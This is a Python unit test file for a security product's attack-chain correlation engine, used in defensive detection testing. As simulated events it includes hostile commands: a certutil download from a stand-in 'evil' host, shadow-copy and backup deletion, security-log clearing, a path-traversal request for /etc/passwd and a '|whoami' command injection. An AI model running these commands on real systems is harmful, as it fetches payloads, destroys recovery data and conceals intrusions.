"""Unit tests for multi-stage chain correlation (v1.7.0).

Every chain shipped before v1.7.0 was unfireable. `_evaluate_chains` required
each step's sigma rule to have fired, and every chain named at least one rule
whose `condition.event_type` no producer in this codebase emits — `connection`
(port_scan, c2_beacon, lateral_movement), `network` (data_exfiltration) and
`file_extension_change` (ransomware_extension_mass_change). Driving the real
engine through the complete attack story with only real producer event types
fired 14 sigma rules and zero chains.

The evaluator itself was also not evaluating a chain. It asked, per step
independently, "did this fire at any point in the last `within` seconds?", which
is an unordered AND: the exact reverse of a chain satisfied it, `within` was
measured from the triggering event rather than from the previous stage,
`max_window_seconds` was declared by every chain and read by nobody, and once
the evidence was logged any later event from that group re-fired the chain — one
attack produced a critical incident per cooldown period for two hours, each
carrying whatever event happened to arrive last as its evidence.

These tests drive the REAL engine (full __init__, real `evaluate()`, the real
`_on_edr_event` translator) with a frozen clock. Each chain gets a firing
sequence and the near-misses that must stay silent.
"""
from __future__ import annotations

import asyncio

import pytest

# A routable, non-safelisted attacker address. RFC-5737 documentation ranges
# (198.51.100.0/24, 203.0.113.0/24) are classified INTERNAL by
# _is_internal_ip and get silently dropped before the alert, which makes them
# useless as test attackers.
ATTACKER = "45.155.205.233"
HOST = "test-macpro"
T0 = 1_800_000_000.0


# ---------------------------------------------------------------------------
# Harness
# ---------------------------------------------------------------------------

class _Clock:
    def __init__(self, t: float = T0):
        self.t = t

    def __call__(self) -> float:
        return self.t

    def advance(self, seconds: float) -> None:
        self.t += seconds


class _Bus:
    def __init__(self):
        self.published: list[tuple[str, dict]] = []

    async def publish(self, topic, data):
        self.published.append((topic, data))

    publish_critical = publish
    publish_high = publish

    def subscribe(self, *a, **k):
        pass


@pytest.fixture
def engine(monkeypatch):
    """A real CorrelationEngine with a frozen clock, no DB, no AI, no watcher."""
    from app.services import correlation_engine as ce

    clock = _Clock()
    monkeypatch.setattr(ce, "_now_ts", clock)

    eng = ce.CorrelationEngine()
    if getattr(eng, "_watcher", None) is not None:
        try:
            eng._watcher.stop()
        except Exception:
            pass
        eng._watcher = None
    eng._event_bus = _Bus()
    eng.incidents = []

    async def _create_incident(rule, alert):
        eng.incidents.append((rule.get("id"), alert))

    async def _fast_triage(event, matches):
        return None

    eng._create_incident = _create_incident
    eng._run_fast_triage = _fast_triage
    eng.clock = clock
    return eng


def run(coro):
    async def _wrapped():
        result = await coro
        for _ in range(4):        # let fire-and-forget incident tasks run
            await asyncio.sleep(0)
        return result
    return asyncio.run(_wrapped())


def chain_alerts(eng) -> list[dict]:
    return [
        data for _topic, data in eng._event_bus.published
        if isinstance(data, dict) and data.get("event_type") == "chain_correlation_triggered"
    ]


def fired_chains(eng) -> list[str]:
    return [a["chain_id"] for a in chain_alerts(eng)]


def fired_rules(eng) -> set[str]:
    return {rule_id for (rule_id, _group) in eng._sigma_fire_log}


# ---------------------------------------------------------------------------
# Stage emitters — only shapes a real producer emits
# ---------------------------------------------------------------------------

async def recon_burst(eng, ip=ATTACKER, n=120):
    """event_normalizer classifies a scanner-UA request as http_request with a
    `scanner` tag; 100+ distinct paths in 60s is sigma_recon_dir_bruteforce."""
    for i in range(n):
        await eng.evaluate({
            "event_type": "http_request", "source_ip": ip,
            "request_path": f"/probe{i}", "path": f"/probe{i}",
            "user_agent": "Nuclei - Open-source project", "tags": ["scanner"],
            "request_method": "GET", "response_status": 404, "source": "sable",
        })


async def exploit_payload(eng, ip=ATTACKER):
    await eng.evaluate({
        "event_type": "web_request", "source_ip": ip,
        "request_path": "/static/../../../../etc/passwd",
        "path": "/static/../../../../etc/passwd",
        "request_method": "GET", "response_status": 200, "source": "sable",
    })


async def webshell_posts(eng, ip=ATTACKER, n=4):
    for _ in range(n):
        await eng.evaluate({
            "event_type": "http_request", "source_ip": ip,
            "request_path": "/uploads/sh.php", "path": "/uploads/sh.php",
            "request_method": "POST", "response_status": 200, "source": "sable",
        })


async def credential_burst(eng, ip=ATTACKER, n=26):
    for i in range(n):
        await eng.evaluate({
            "event_type": "auth_failure", "source_ip": ip,
            "request_path": "/admin/signin", "path": "/admin/signin",
            "request_method": "POST", "response_status": 401,
            "username": f"user{i}", "source": "sable",
        })


async def auth_success(eng, ip=ATTACKER):
    await eng.evaluate({
        "event_type": "http_request", "source_ip": ip,
        "request_path": "/admin/signin", "path": "/admin/signin",
        "request_method": "POST", "response_status": 302, "source": "sable",
    })


async def command_injection(eng, ip=ATTACKER, n=3):
    for _ in range(n):
        await eng.evaluate({
            "event_type": "priv_escalation", "source_ip": ip,
            "request_path": "/cgi?c=|whoami", "path": "/cgi?c=|whoami",
            "request_method": "GET", "response_status": 200, "source": "sable",
        })


async def proc(eng, command_line, host=HOST, exe=None):
    """Through the real _on_edr_event, with host_monitor's own field names."""
    await eng._on_edr_event({
        "kind": "process_start", "hostname": host,
        "process_name": command_line.split()[0],
        "command_line": command_line,
        "process_path": exe or "/usr/bin/" + command_line.split()[0],
    })


async def file_event(eng, path, kind="file_modify", host=HOST):
    await eng._on_edr_event({"kind": kind, "hostname": host, "path": path})


# ---------------------------------------------------------------------------
# The regression the whole redesign exists for
# ---------------------------------------------------------------------------

def test_no_chain_leg_sits_on_an_event_type_without_a_producer(engine):
    """The bug that made all six original chains dead, pinned.

    `connection`, `network` and `file_extension_change` appear in the rule set
    only as rule conditions. Nothing publishes them: the one mapping that could
    produce `connection` is _EDR_EVENT_MAP["network_anomaly"], and host_monitor
    publishes that kind on `edr.suspicious_process`, a topic start() does not
    subscribe to.
    """
    from app.services.event_normalizer import PATTERNS

    producible = {p.event_type for p in PATTERNS} | {
        "http_request", "auth_failure", "http_auth_failure", "ssh_honeypot_failure",
        "ssh_real_failure", "process_creation", "file_creation", "file_modification",
        "honeypot_interaction",
    }
    by_id = {rule["id"]: rule for rule in engine._rules}
    offenders = []
    for chain in engine._chain_rules:
        for step in chain.get("chain", []):
            for rule_id in (step.get("rule_ids") or []):
                rule = by_id.get(rule_id)
                if rule is None:
                    offenders.append((chain["id"], rule_id, "rule not loaded"))
                    continue
                event_type = rule["condition"].get("event_type")
                if event_type not in producible:
                    offenders.append((chain["id"], rule_id, event_type))
            step_type = step.get("event_type")
            if step_type and step_type not in producible:
                offenders.append((chain["id"], "<event_type step>", step_type))
    assert not offenders, f"chain legs with no producer: {offenders}"


def test_event_type_step_honours_the_alias_table(engine):
    """An `event_type` step must resolve through _event_type_satisfies, not ==.

    A strict equality defeats _EVENT_TYPE_ALIASES: a step declaring
    `web_request` would never see the `http_request` events production emits.
    That exact bug made 43 of 48 web rules unreachable in _check_rule; a chain
    step is the third comparison site and must not reintroduce it. No shipped
    chain uses an event_type step, but POST /api/v1/correlation/rules lets an
    operator add one.
    """
    engine._chain_rules.append({
        "id": "alias_probe_chain", "title": "alias probe", "severity": "critical",
        "group_by": "source_ip", "cooldown_seconds": 0, "max_window_seconds": 600,
        "chain": [
            {"event_type": "web_request", "within": 600},
            {"sigma_rule": "web_shell_activity", "within": 600},
        ],
    })

    async def go():
        # An http_request event must satisfy a step declaring web_request.
        await engine.evaluate({
            "event_type": "http_request", "source_ip": ATTACKER,
            "request_path": "/x", "path": "/x",
            "request_method": "GET", "response_status": 200,
        })
        engine.clock.advance(30)
        await webshell_posts(engine)
    run(go())
    assert "alias_probe_chain" in fired_chains(engine)


def test_unknown_chain_leg_is_reported(engine):
    """A leg naming a rule that is not loaded must be loud at load time."""
    engine._chain_rules.append({
        "id": "bogus_chain", "title": "bogus", "severity": "critical",
        "group_by": "source_ip",
        "chain": [{"sigma_rule": "no_such_rule_anywhere", "within": 60}],
    })
    assert ("bogus_chain", "no_such_rule_anywhere") in engine._report_unknown_chain_legs()


def test_disabled_chain_leg_is_reported(engine):
    """A leg naming a DISABLED rule is as dead as one naming a missing rule:
    evaluate() skips disabled rules before _check_rule, so the leg never reaches
    the fire-log. Four legs across two chains were caught this way after the
    mechanical audit had already cleared them on event_type and filter fields
    (sigma_persist_login_hook / _scheduled_task / _startup_folder and
    sigma_web_marimo_terminal_rce all ship enabled: false)."""
    victim = next(r for r in engine._rules if r.get("enabled", True))
    victim.enabled = False
    engine._chain_rules.append({
        "id": "disabled_leg_chain", "title": "x", "severity": "critical",
        "group_by": "source_ip",
        "chain": [{"sigma_rule": victim["id"], "within": 60}],
    })
    assert ("disabled_leg_chain", victim["id"]) in engine._report_unknown_chain_legs()


def test_shipped_pack_has_no_unknown_or_disabled_chain_legs(engine):
    assert engine._report_unknown_chain_legs() == []


# ---------------------------------------------------------------------------
# Ordering, windows and span — the evaluator's semantics
# ---------------------------------------------------------------------------

def test_web_chain_fires_on_the_ordered_sequence(engine):
    async def go():
        await recon_burst(engine)
        engine.clock.advance(120)
        await exploit_payload(engine)
        engine.clock.advance(60)
        await webshell_posts(engine)
    run(go())
    assert "web_recon_to_exploit_chain" in fired_chains(engine)


def test_web_chain_reports_the_ordered_stage_evidence(engine):
    async def go():
        await recon_burst(engine)
        engine.clock.advance(120)
        await exploit_payload(engine)
        engine.clock.advance(60)
        await webshell_posts(engine)
    run(go())
    alert = next(a for a in chain_alerts(engine)
                 if a["chain_id"] == "web_recon_to_exploit_chain")
    stages = alert["chain_evidence"]["stages"]
    assert [s["stage"] for s in stages] == [
        "enumeration burst", "exploitation payload", "post-exploitation interaction",
    ]
    # strictly increasing timestamps — the evidence proves a sequence
    assert [s["at"] for s in stages] == sorted(s["at"] for s in stages)
    assert alert["chain_evidence"]["span_seconds"] == pytest.approx(180.0)
    assert alert["source_ip"] == ATTACKER


def test_web_chain_silent_without_the_middle_stage(engine):
    async def go():
        await recon_burst(engine)
        engine.clock.advance(120)
        await webshell_posts(engine)
    run(go())
    assert fired_chains(engine) == []


def test_web_chain_silent_in_reverse_order(engine):
    """The old evaluator fired on this: it never checked order."""
    async def go():
        await webshell_posts(engine)
        engine.clock.advance(60)
        await exploit_payload(engine)
        engine.clock.advance(120)
        await recon_burst(engine)
    run(go())
    assert fired_chains(engine) == []


def test_web_chain_silent_when_a_stage_falls_outside_its_window(engine):
    """Stage 3 declares within: 900 — measured from stage 2, not from now."""
    async def go():
        await recon_burst(engine)
        engine.clock.advance(120)
        await exploit_payload(engine)
        engine.clock.advance(1000)
        await webshell_posts(engine)
    run(go())
    assert fired_chains(engine) == []


def test_step_within_is_relative_to_the_previous_stage(engine):
    """Stage 2 declares within: 1800; 2000s after stage 1 must not satisfy it."""
    async def go():
        await recon_burst(engine)
        engine.clock.advance(2000)
        await exploit_payload(engine)
        engine.clock.advance(60)
        await webshell_posts(engine)
    run(go())
    assert fired_chains(engine) == []


def test_a_slow_sequence_still_fires_inside_the_windows(engine):
    """The first stage's `within` is how far back the chain looks for its anchor;
    every later stage's `within` is measured from the stage before it. A sequence
    that crawls but respects both still fires."""
    async def go():
        await recon_burst(engine)
        engine.clock.advance(800)            # inside stage 2's within (1800)
        await exploit_payload(engine)
        engine.clock.advance(890)            # inside stage 3's within (900)
        await webshell_posts(engine)         # anchor is now 1690s old, under 1800
    run(go())
    assert "web_recon_to_exploit_chain" in fired_chains(engine)


def test_max_window_seconds_rejects_a_sequence_that_exceeds_it(engine):
    """max_window_seconds was dead: declared by every chain, read by nobody, so a
    chain's total span was bounded only by the fire-log's 2h retention."""
    chain = next(c for c in engine._chain_rules if c["id"] == "web_recon_to_exploit_chain")
    assert chain.get("max_window_seconds") == 2700, "the chain must declare a span"
    chain.max_window_seconds = 600

    async def go():
        await recon_burst(engine)
        engine.clock.advance(400)           # each step is inside its own `within`
        await exploit_payload(engine)
        engine.clock.advance(400)           # but 800s first-to-last > the 600s span
        await webshell_posts(engine)
    run(go())
    assert fired_chains(engine) == []


# ---------------------------------------------------------------------------
# Duplicate suppression (the 25-incidents-per-attack defect)
# ---------------------------------------------------------------------------

def test_stale_evidence_does_not_re_fire_the_chain(engine):
    """One attack must not become one critical incident per cooldown period.

    Measured on the old evaluator: a single completed sequence produced 25 chain
    incidents over one 2h fire-log retention window, each triggered by ordinary
    traffic and each carrying that traffic as its evidence.
    """
    async def go():
        await recon_burst(engine)
        engine.clock.advance(120)
        await exploit_payload(engine)
        engine.clock.advance(60)
        await webshell_posts(engine)
        first = len(fired_chains(engine))
        for _ in range(24):
            engine.clock.advance(1900)      # past the chain's 1800s cooldown
            await eng_benign(engine)
        return first
    first = run(go())
    assert first == 1
    assert len(fired_chains(engine)) == 1


async def eng_benign(engine, ip=ATTACKER):
    await engine.evaluate({
        "event_type": "http_request", "source_ip": ip, "request_path": "/",
        "path": "/", "request_method": "GET", "response_status": 200,
    })


def test_chain_re_fires_when_the_sequence_genuinely_advances(engine):
    """Suppression must not become silence: new final-stage evidence is signal."""
    async def go():
        await proc(engine, "certutil.exe -urlcache -f http://evil/p.exe p.exe")
        engine.clock.advance(60)
        await proc(engine, "vssadmin.exe delete shadows /all /quiet")
        first = len(fired_chains(engine))
        engine.clock.advance(1000)                      # cooldown is 900
        await file_event(engine, "/tmp/unrelated.log")  # benign: no new stage
        after_benign = len(fired_chains(engine))
        engine.clock.advance(100)
        await proc(engine, "wbadmin.exe delete catalog -quiet")   # stage 2 again
        return first, after_benign
    first, after_benign = run(go())
    assert (first, after_benign) == (1, 1)
    assert len(fired_chains(engine)) == 2


# ---------------------------------------------------------------------------
# Grouping
# ---------------------------------------------------------------------------

def test_fire_log_is_keyed_by_every_chain_group_field(engine):
    """The fire-log was keyed only by source_ip, so a chain grouped by anything
    else looked for its legs under a key nothing ever wrote."""
    assert engine._chain_group_fields[0] == "source_ip"
    assert "hostname" in engine._chain_group_fields

    async def go():
        await proc(engine, "vssadmin.exe delete shadows /all /quiet", host="hostA")
    run(go())
    keys = set(engine._sigma_fire_log)
    assert ("ransomware_vss_delete", "hostA") in keys
    assert ("ransomware_vss_delete", "127.0.0.1") in keys


def test_host_chain_does_not_span_two_hosts(engine):
    async def go():
        await proc(engine, "certutil.exe -urlcache -f http://evil/p.exe p.exe", host="hostA")
        engine.clock.advance(120)
        await proc(engine, "vssadmin.exe delete shadows /all /quiet", host="hostB")
    run(go())
    assert fired_chains(engine) == []


def test_edr_events_always_carry_a_host_identity(engine):
    """_on_edr_event stamped no hostname, so every host-grouped rule and chain
    resolved its key to "__all__" and the host chains were dead in production."""
    async def go():
        await engine._on_edr_event({
            "kind": "process_start", "process_name": "vssadmin.exe",
            "command_line": "vssadmin.exe delete shadows /all /quiet",
            "process_path": "/usr/bin/vssadmin.exe",
        })
    run(go())
    hostnames = {event.get("hostname") for _ts, event in engine._window}
    assert hostnames and all(h for h in hostnames), (
        f"EDR event reached the engine without a hostname: {hostnames}"
    )


# ---------------------------------------------------------------------------
# ransomware_chain
# ---------------------------------------------------------------------------

def test_ransomware_chain_fires_on_staging_then_recovery_inhibition(engine):
    async def go():
        await proc(engine, "certutil.exe -urlcache -f http://evil/p.exe p.exe")
        engine.clock.advance(300)
        await proc(engine, "vssadmin.exe delete shadows /all /quiet")
    run(go())
    assert "ransomware_chain" in fired_chains(engine)


def test_ransomware_chain_silent_on_recovery_inhibition_alone(engine):
    async def go():
        await proc(engine, "vssadmin.exe delete shadows /all /quiet")
    run(go())
    assert fired_chains(engine) == []


def test_ransomware_chain_silent_in_reverse_order(engine):
    async def go():
        await proc(engine, "vssadmin.exe delete shadows /all /quiet")
        engine.clock.advance(300)
        await proc(engine, "certutil.exe -urlcache -f http://evil/p.exe p.exe")
    run(go())
    assert fired_chains(engine) == []


def test_ransomware_chain_silent_outside_the_window(engine):
    async def go():
        await proc(engine, "certutil.exe -urlcache -f http://evil/p.exe p.exe")
        engine.clock.advance(4000)          # stage 2 within is 3600
        await proc(engine, "vssadmin.exe delete shadows /all /quiet")
    run(go())
    assert fired_chains(engine) == []


def test_host_chain_reports_no_attacker_ip_so_nothing_can_be_blocked(engine):
    """Host telemetry has no attacker address. _on_edr_event stamps 127.0.0.1,
    which is internal AND safelisted, so the IP gates discarded every host-based
    chain. Host chains now report through, with source_ip=None on purpose: the
    responder has no address to act on, so the self-lockout the gates exist to
    prevent still cannot happen."""
    async def go():
        await proc(engine, "certutil.exe -urlcache -f http://evil/p.exe p.exe")
        engine.clock.advance(300)
        await proc(engine, "vssadmin.exe delete shadows /all /quiet")
    run(go())
    alert = next(a for a in chain_alerts(engine) if a["chain_id"] == "ransomware_chain")
    assert alert["source_ip"] is None
    assert alert["group_by"] == "hostname"
    assert alert["host"] == HOST
    assert engine.incidents and engine.incidents[0][0] == "ransomware_chain"


# ---------------------------------------------------------------------------
# host_post_exploitation_chain
# ---------------------------------------------------------------------------

def test_host_post_exploitation_chain_fires(engine):
    async def go():
        await proc(engine, "certutil -urlcache -f http://evil/impl impl")
        engine.clock.advance(120)
        await file_event(engine, "/Users/admin/.ssh/authorized_keys")
        engine.clock.advance(120)
        await proc(engine, "wevtutil cl Security")
    run(go())
    assert "host_post_exploitation_chain" in fired_chains(engine)


def test_host_post_exploitation_chain_silent_without_persistence(engine):
    async def go():
        await proc(engine, "certutil -urlcache -f http://evil/impl impl")
        engine.clock.advance(120)
        await proc(engine, "wevtutil cl Security")
    run(go())
    assert "host_post_exploitation_chain" not in fired_chains(engine)


def test_host_post_exploitation_chain_silent_when_persistence_comes_first(engine):
    async def go():
        await file_event(engine, "/Users/admin/.ssh/authorized_keys")
        engine.clock.advance(120)
        await proc(engine, "certutil -urlcache -f http://evil/impl impl")
        engine.clock.advance(120)
        await proc(engine, "wevtutil cl Security")
    run(go())
    assert "host_post_exploitation_chain" not in fired_chains(engine)


# ---------------------------------------------------------------------------
# credential_breach_chain and the chain_only mechanism
# ---------------------------------------------------------------------------

def test_credential_breach_chain_fires_on_burst_success_activity(engine):
    async def go():
        await credential_burst(engine)
        engine.clock.advance(60)
        await auth_success(engine)
        engine.clock.advance(60)
        await command_injection(engine)
    run(go())
    assert "credential_breach_chain" in fired_chains(engine)


def test_credential_breach_chain_silent_without_a_successful_login(engine):
    async def go():
        await credential_burst(engine)
        engine.clock.advance(60)
        await command_injection(engine)
    run(go())
    assert "credential_breach_chain" not in fired_chains(engine)


def test_credential_breach_chain_silent_when_the_session_is_not_abused(engine):
    """A real user who mistypes their password and then logs in successfully.
    Two of three stages is not a breach, and this platform blocks autonomously."""
    async def go():
        await credential_burst(engine)
        engine.clock.advance(60)
        await auth_success(engine)
    run(go())
    assert fired_chains(engine) == []


def test_chain_only_rule_never_opens_an_incident(engine):
    """chain_leg_auth_success exists so the chain can see a stage that is benign
    in isolation. Every rule used to create an incident when it fired, which is
    why no chain could use a low-signal stage."""
    async def go():
        await auth_success(engine)
    run(go())
    assert "chain_leg_auth_success" in fired_rules(engine)
    assert engine.incidents == []
    assert chain_alerts(engine) == []


def test_chain_only_rule_stays_out_of_the_triggered_set(engine):
    """A chain-only leg must not reach fast_triage or the campaign tracker."""
    async def go():
        return await engine.evaluate({
            "event_type": "http_request", "source_ip": ATTACKER,
            "request_path": "/admin/signin", "path": "/admin/signin",
            "request_method": "POST", "response_status": 302,
        })
    triggered = run(go())
    assert [r["id"] for r in triggered] == []


def test_chain_only_flag_is_not_set_on_alerting_rules(engine):
    """Exactly the legs meant to be silent are silent."""
    silent = {rule["id"] for rule in engine._rules if rule.get("chain_only", False)}
    assert silent == {"chain_leg_auth_success"}


# ---------------------------------------------------------------------------
# Noise discipline
# ---------------------------------------------------------------------------

def test_wordpress_admin_after_failed_logins_does_not_fire(engine):
    """The false positive that removed web_shell_activity and
    sigma_web_file_upload from credential_breach_chain's final stage: both fire
    on any POST to a `.php` path, which is every WordPress admin save."""
    async def go():
        for i in range(30):
            await engine.evaluate({
                "event_type": "auth_failure", "source_ip": ATTACKER,
                "request_path": "/wp-login.php", "path": "/wp-login.php",
                "request_method": "POST", "response_status": 401, "username": f"u{i}",
            })
        engine.clock.advance(30)
        await auth_success(engine)
        engine.clock.advance(30)
        for _ in range(8):
            await engine.evaluate({
                "event_type": "http_request", "source_ip": ATTACKER,
                "request_path": "/wp-admin/admin-ajax.php",
                "path": "/wp-admin/admin-ajax.php",
                "request_method": "POST", "response_status": 200,
            })
    run(go())
    assert fired_chains(engine) == []


def test_admin_browsing_many_pages_after_login_does_not_fire(engine):
    async def go():
        await credential_burst(engine, n=30)
        engine.clock.advance(30)
        await auth_success(engine)
        engine.clock.advance(30)
        for i in range(200):
            await engine.evaluate({
                "event_type": "http_request", "source_ip": ATTACKER,
                "request_path": f"/admin/report/{i}", "path": f"/admin/report/{i}",
                "request_method": "GET", "response_status": 200,
            })
    run(go())
    assert fired_chains(engine) == []


def test_routine_host_maintenance_does_not_fire(engine):
    async def go():
        await proc(engine, "bash -i deploy.sh", exe="/bin/bash")
        engine.clock.advance(10)
        await file_event(engine, "/etc/systemd/system/aegis.service")
        engine.clock.advance(10)
        await proc(engine, "logrotate -f /etc/logrotate.conf", exe="/usr/sbin/logrotate")
        engine.clock.advance(10)
        for i in range(300):                    # npm install churn under /tmp
            await file_event(engine, f"/tmp/npm-cache/{i}.json")
    run(go())
    assert fired_chains(engine) == []


def test_scanner_burst_alone_does_not_fire(engine):
    async def go():
        await recon_burst(engine, n=150)
    run(go())
    assert fired_chains(engine) == []


def test_safelisted_and_internal_sources_cannot_fire_an_ip_chain(engine):
    for ip in ("127.0.0.1", "100.64.0.13", "192.168.1.50", "203.0.113.9"):
        engine._event_bus.published.clear()
        engine._chain_fired.clear()

        async def go(ip=ip):
            await recon_burst(engine, ip=ip)
            engine.clock.advance(120)
            await exploit_payload(engine, ip=ip)
            engine.clock.advance(60)
            await webshell_posts(engine, ip=ip)
        run(go())
        assert fired_chains(engine) == [], f"{ip} produced a chain alert"


# ---------------------------------------------------------------------------
# Memory bounds
# ---------------------------------------------------------------------------

def test_chain_evidence_cannot_outlive_its_cooldown_entry(engine):
    engine._chain_fired[("gone", "x")] = engine.clock.t - 10_000
    engine._chain_evidence[("gone", "x")] = {"stages": []}
    engine._prune_state(now=engine.clock.t)
    assert ("gone", "x") not in engine._chain_evidence
    assert ("gone", "x") not in engine._chain_fired


def test_chain_evidence_never_exceeds_the_cooldown_map(engine):
    async def go():
        await proc(engine, "certutil.exe -urlcache -f http://evil/p.exe p.exe")
        engine.clock.advance(300)
        await proc(engine, "vssadmin.exe delete shadows /all /quiet")
    run(go())
    engine._prune_state(now=engine.clock.t)
    assert len(engine._chain_evidence) <= len(engine._chain_fired)


def test_evaluate_does_not_create_fire_log_keys_for_rules_that_did_not_fire(engine):
    """_sigma_fire_log is a defaultdict; _evaluate_chains must read it with
    .get() so evaluating a chain cannot mint a key per (leg, group) pair."""
    async def go():
        await eng_benign(engine)
    before = len(engine._sigma_fire_log)
    run(go())
    assert len(engine._sigma_fire_log) == before


# ---------------------------------------------------------------------------
# Schema
# ---------------------------------------------------------------------------

def test_step_must_name_something_to_wait_for():
    from pydantic import ValidationError
    from app.schemas.rule import ChainRule

    with pytest.raises(ValidationError):
        ChainRule.model_validate({
            "id": "empty_step_chain", "name": "x", "severity": "critical",
            "chain": [{"within": 60}],
        })


def test_step_cannot_set_both_sigma_rule_and_any_of():
    from pydantic import ValidationError
    from app.schemas.rule import ChainRule

    with pytest.raises(ValidationError):
        ChainRule.model_validate({
            "id": "both_chain", "name": "x", "severity": "critical",
            "chain": [{"sigma_rule": "a", "any_of": ["b"], "within": 60}],
        })


def test_any_of_step_satisfied_by_any_named_rule(engine):
    """Every leg of `recovery inhibition` must be able to satisfy that stage."""
    chain = next(c for c in engine._chain_rules if c["id"] == "ransomware_chain")
    inhibition = chain["chain"][-1]
    assert len(inhibition.get("any_of") or []) >= 4

    for command in ("vssadmin.exe delete shadows /all /quiet",
                    "wbadmin.exe delete catalog -quiet",
                    "bcdedit /set recoveryenabled no",
                    "tmutil delete /Volumes/TM/snap"):
        eng_state = (len(engine._event_bus.published), )
        engine._event_bus.published.clear()
        engine._chain_fired.clear()
        engine._sigma_fire_log.clear()
        engine._fired.clear()

        async def go(command=command):
            await proc(engine, "certutil.exe -urlcache -f http://evil/p.exe p.exe")
            engine.clock.advance(120)
            await proc(engine, command)
        run(go())
        assert "ransomware_chain" in fired_chains(engine), (
            f"recovery-inhibition leg did not satisfy its stage: {command}"
        )
        engine.clock.advance(2000)
        assert eng_state  # keep the loop body explicit about its reset
